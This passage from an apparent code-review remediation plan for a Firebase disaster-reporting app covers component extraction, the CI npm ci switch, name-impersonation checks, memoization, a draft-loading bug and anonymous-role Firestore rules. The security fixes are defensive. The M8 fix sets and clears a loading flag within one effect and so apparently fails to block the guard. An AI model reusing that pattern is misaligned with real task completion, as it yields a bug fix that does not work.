   ```

**acceptance_criteria:**
- `docs/rbac-divergence.md` exists and documents both RBAC systems
- `src/utils/rbacConfig.js` exports the canonical role constants
- `firestore.rules` comments reference `rbacConfig.js` for the authoritative role list
- CI script `verify-rbac-consistency.js` exists and compares role constants

**files_modified:** `firestore.rules`, `src/utils/rbac.js`, `src/utils/rbacConfig.js` (create), `docs/rbac-divergence.md` (create), `.github/workflows/ci.yml`, `scripts/verify-rbac-consistency.js` (create)

---

### M4: ReportDetailCard in App.jsx

**Files:** `src/App.jsx`, `src/components/Feed/ReportDetailCard.jsx` (create)

**read_first:**
- `src/App.jsx` lines 44–133 (ReportDetailCard definition)

**Problem:** `ReportDetailCard` is defined inside `App.jsx` (a 340-line file). It should be extracted to its own component file.

**action:**
1. Cut lines 44–133 from `src/App.jsx` and move to `src/components/Feed/ReportDetailCard.jsx`
2. Add the necessary imports in the new file:
   ```jsx
   import { formatTimeAgo } from '../utils/timeUtils';
   ```
3. In `src/App.jsx`, add:
   ```jsx
   import ReportDetailCard from './components/Feed/ReportDetailCard';
   ```
4. Keep the `severity` and `status` style objects in `src/App.jsx` or move them to the component if they are only used there.

**acceptance_criteria:**
- `src/components/Feed/ReportDetailCard.jsx` exists with the component definition
- `src/App.jsx` no longer contains `function ReportDetailCard`
- `grep -n "function ReportDetailCard\|const ReportDetailCard" src/App.jsx` returns no matches
- `grep -n "import ReportDetailCard" src/App.jsx` returns the import

**files_modified:** `src/App.jsx`, `src/components/Feed/ReportDetailCard.jsx` (create)

---

### M5: CI uses npm install instead of npm ci

**Files:** `.github/workflows/ci.yml`

**read_first:**
- `.github/workflows/ci.yml` line 29

**Problem:** CI uses `npm install`, which can install different versions than the lockfile specifies. The project instructions specify `npm ci` for lockfile fidelity.

**action:**
In `.github/workflows/ci.yml` line 29, change:
```yaml
run: npm install
```
to:
```yaml
run: npm ci
```

**acceptance_criteria:**
- `grep -n "npm ci" .github/workflows/ci.yml` returns the install step
- `grep -n "npm install\b" .github/workflows/ci.yml` returns no matches (except in comments)

**files_modified:** `.github/workflows/ci.yml`

---

### M6: Reporter name user-controlled

**Files:** `firestore.rules`, `src/hooks/useReports.js`, `src/components/Feed/FeedPost.jsx`

**read_first:**
- `src/hooks/useReports.js` around line 237 (reporter name assignment)
- `firestore.rules` (reporter.name validation)

**Problem:** Users can set arbitrary `reporter.name` values. A malicious user could set their name to "Provincial Administrator" or "Mayor" to impersonate officials.

**action:**
In `useReports.js`, force `reporter.name` from `user.displayName` for authenticated users, and only allow custom names for anonymous users or enforce a sanitized display-name-only approach:

```js
// Around line 237:
name: user.isAnonymous
  ? 'Anonymous'
  : (user.displayName || 'Anonymous'),
```

In `firestore.rules`, tighten validation:
```firestore
function isValidReporterName(name) {
  return name is string
    && name.size() >= 1
    && name.size() <= 100
    && !name.matches('(?i).*(admin|moderator|mayor|governor|official).*');
}
```

And in the report creation rule, require `reporter.name` to pass `isValidReporterName`.

**acceptance_criteria:**
- `useReports.js` uses `user.displayName` for authenticated users, 'Anonymous' for anonymous
- `firestore.rules` has `isValidReporterName` that blocks impersonation keywords
- `FeedPost.jsx` displays `reporter.name` with `sanitizeText()` (already done for description, extend to name field)

**files_modified:** `src/hooks/useReports.js`, `firestore.rules`, `src/components/Feed/FeedPost.jsx`

---

### M7: useAuth derived values not memoized

**Files:** `src/hooks/useAuth.js`

**read_first:**
- `src/hooks/useAuth.js` lines 299–301

**Problem:** `isAdmin` and `isSuperAdmin` are computed on every render, not memoized.

**action:**
Wrap `isAdmin` and `isSuperAdmin` in `useMemo`:

```js
const isAdmin = useMemo(
  () => userProfile?.role?.startsWith('admin_') || userProfile?.role === 'superadmin_provincial',
  [userProfile?.role]
);
const isSuperAdmin = useMemo(
  () => userProfile?.role === 'superadmin_provincial',
  [userProfile?.role]
);
```

**acceptance_criteria:**
- `grep -n "useMemo" src/hooks/useAuth.js` returns both isAdmin and isSuperAdmin wrapped
- `grep -n "const isAdmin =\\|const isSuperAdmin =" src/hooks/useAuth.js` shows useMemo declarations

**files_modified:** `src/hooks/useAuth.js`

---

### M8: Draft loading silently clears manualMunicipality

**Files:** `src/components/Reports/ReportModal.jsx`

**read_first:**
- `src/components/Reports/ReportModal.jsx` lines 104–120 (load draft effect), 138–144 (guard effect)

**Problem:** When a draft loads with `manualMunicipality` set (line 112), the `useEffect` at lines 138–144 immediately fires. This effect checks if `manualMunicipality` is in `MUNICIPALITY_COORDS` — but if the draft was saved with a municipality not currently in the app's coordinate map, the guard effect clears it immediately after loading.

**action:**
Add a flag to skip the guard during draft loading:

```js
const [isLoadingDraft, setIsLoadingDraft] = useState(false);

// Draft loading effect (lines 104–120):
useEffect(() => {
  if (isOpen) {
    const draft = loadDraft();
    if (draft && draft.step) {
      if (draft.formData?.description) {
        setIsLoadingDraft(true);  // <-- set before loading
        setFormData(draft.formData || {});
        setReportType(draft.reportType || null);
        setManualMunicipality(draft.manualMunicipality || '');
        if (draft.step > 1) {
          setStep(draft.step);
        }
        addToast('Resumed from saved draft', 'info');
        setIsLoadingDraft(false);  // <-- clear after
      }
    }
  }
}, [isOpen, addToast]);

// Guard effect (lines 138–144):
useEffect(() => {
  if (isLoadingDraft) return;  // <-- skip during draft load
  if (manualMunicipality && !MUNICIPALITY_COORDS[manualMunicipality]) {
    addToast('Selected municipality is not supported. Please choose from the list.', 'error');
    setManualMunicipality(null);
  }
}, [manualMunicipality, addToast, setManualMunicipality, isLoadingDraft]);
```

**acceptance_criteria:**
- `grep -n "isLoadingDraft" src/components/Reports/ReportModal.jsx` returns >= 4 occurrences (useState, set true, set false, guard check)
- Draft with `manualMunicipality` from `loadDraft()` does NOT trigger the guard effect during load

**files_modified:** `src/components/Reports/ReportModal.jsx`

---

### M9: Anonymous auth + no user doc creates role='' bypass

**Files:** `firestore.rules`

**read_first:**
- `firestore.rules` lines 12–15 (userRole function), 43–48 (canCreateReports)

**Problem:** Anonymous users have no user document, so `userRole()` returns `''`. The `canCreateReports()` function at line 47 includes `role == ''` to allow new users to submit reports. However, `role == ''` for anonymous users combined with the fact anonymous accounts have no user doc could interact badly with other rules.

**action:**
In `firestore.rules`, explicitly handle anonymous users with a named function:

```firestore
function isAnonymous() {
  return request.auth != null && request.auth.token.firebase.sign_in_provider == 'anonymous';
}

function userRole() {
  if (isAnonymous()) {
    return 'anonymous';  // Explicit role instead of ''
  }
  let userPath = /databases/$(database)/documents/users/$(request.auth.uid);
  return isSignedIn() && exists(userPath) ? get(userPath).data.role : '';
}
```

Update `canCreateReports`:
```firestore
function canCreateReports() {
  let role = userRole();
  return role == 'user' || role == 'moderator' || isAdmin() || role == 'anonymous';
}
```

**acceptance_criteria:**
- `firestore.rules` has `isAnonymous()` function
- `userRole()` returns 'anonymous' for anonymous providers
- `canCreateReports()` explicitly checks `role == 'anonymous'` instead of `role == ''`

**files_modified:** `firestore.rules`

---

## Files to Modify (Summary)

| File | Issues |
|------|--------|
| `src/components/Feed/FeedPost.jsx` | C1, H6, M6 |
| `src/components/Map/DisasterMarker.jsx` | C1 |
| `public/firebase-messaging-sw.js` | C2 (create) |
| `src/hooks/useReports.js` | C3, C5, H7, H9, M1, M2, M6 |
| `src/hooks/useGeolocation.js` | C4 |
| `src/hooks/useRateLimit.js` | C5 |
| `firestore.rules` | H1, H7, H8*, M2, M3, M6, M9 |
| `.github/workflows/ci.yml` | H2, M5 |
| `package.json` | H2 |
| `tests/emulator/rules.test.js` | H2 (create) |
| `e2e/auth-flows.spec.js` | H3 (create) |
| `e2e/report-submission.spec.js` | H3 (create) |
| `e2e/upvote.spec.js` | H3 (create) |
| `e2e/admin-workflow.spec.js` | H3 (create) |
| `src/hooks/useWeather.js` | H4 |
| `src/components/Feed/EngagementButtons.jsx` | H5, H7, M2 |
| `src/utils/rbac.js` | M3 |
| `src/utils/rbacConfig.js` | M3 (create) |
| `docs/rbac-divergence.md` | M3 (create) |
| `scripts/verify-rbac-consistency.js` | M3 (create) |
| `src/App.jsx` | M4 |
| `src/components/Feed/ReportDetailCard.jsx` | M4 (create) |
| `src/hooks/useAuth.js` | H1, H8, M7 |
| `src/components/Reports/ReportModal.jsx` | M8 |
| Cloud Function files (new) | H1, H4, H8 |

*H8 requires a Cloud Function for the full implementation; client-side fingerprint generation can be done immediately.

---

## PR Strategy

**Recommended: Single PR** for all fixes, organized by phase with clear commit messages. Each fix is independently testable. The CI pipeline (lint -> format:check -> test:run -> build) provides adequate safeguard.

**Exception:** H1 (Custom Claims), H2 (Emulator tests), H4 (Cloud Function for weather), H8 (Cloud Function for anonymous linking) each require Cloud Function deployment and should be separate PRs.

**Commit structure per phase:**
```
fix(FeedPost): sanitize description to prevent XSS
fix(DisasterMarker): sanitize description to prevent XSS
feat(firebase-messaging-sw): add FCM service worker for push notifications
fix(useReports): filter resolved reports server-side, add verification.status query
fix(useGeolocation): remove stale effect dependency, add mount guard
fix(useRateLimit): await actionFn in performAction for proper async error handling
...
```
